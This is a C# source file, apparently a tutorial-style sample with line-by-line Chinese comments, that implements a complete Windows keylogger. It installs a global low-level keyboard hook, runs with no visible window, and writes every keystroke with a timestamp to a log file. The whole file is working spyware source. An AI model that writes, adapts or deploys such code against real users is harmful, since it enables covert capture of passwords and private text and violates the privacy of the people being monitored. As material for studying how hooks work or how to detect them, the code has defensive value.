using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices; //引入System.Runtime.InteropServices命名空间，包含用于与非托管代码交互的类型
using System.IO; //引入System.IO命名空间，包含访问文件和目录的类
using System.Diagnostics;

namespace KeyHook
{
    internal static class Program
    {
        //这些函数用于设置和取消钩子，以及将钩子消息传递给下一个钩子或默认过程。
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        //[STAThread]

        private const int WH_KEYBOARD_LL = 13; //定义常量WH_KEYBOARD_LL，表示键盘低级钩子的类型
        private const int WM_KEYDOWN = 0x0100; //定义常量WM_KEYDOWN，表示键被按下的消息
        private static LowLevelKeyboardProc _proc = HookCallback; //声明LowLevelKeyboardProc类型的_proc变量，并初始化为HookCallback方法
        private static IntPtr _hookID = IntPtr.Zero; //声明IntPtr类型的_hookID变量，并初始化为IntPtr类型的0
        static void Main()
        {
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());

            _hookID = SetHook(_proc); //将_hookID变量设置为_SetHook方法返回的值
            Application.Run(); //启动应用程序的标准应用程序消息循环
            UnhookWindowsHookEx(_hookID); //从挂钩链中移除钩子过程


        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) //定义_SetHook方法，用于设置键盘钩子
        {
            using (Process curProcess = Process.GetCurrentProcess()) //获取当前进程
            using (ProcessModule curModule = curProcess.MainModule) //获取当前进程的主模块
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, //设置钩子
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam); //定义代表LowLevelKeyboardProc的委托类型

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) //定义HookCallback方法，用于处理钩子过程
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) //如果按键被按下
            {
                string currentTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");//获取当前时间，精确到秒
                int vkCode = Marshal.ReadInt32(lParam); //从内存中读取指定位置的32位有符号整数
                StreamWriter sw = new StreamWriter(Application.StartupPath + "\\log.txt", true); //创建用于向文件写入文本的StreamWriter对象
                sw.WriteLine(currentTime+"       "+(Keys)vkCode); //将按键码转换为Key枚举值，并写入到文件中
                sw.Close(); //关闭StreamWriter对象并释放所有关联的资源
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam); //将信息传递到链中的下一个钩子过程
        }


    }
}
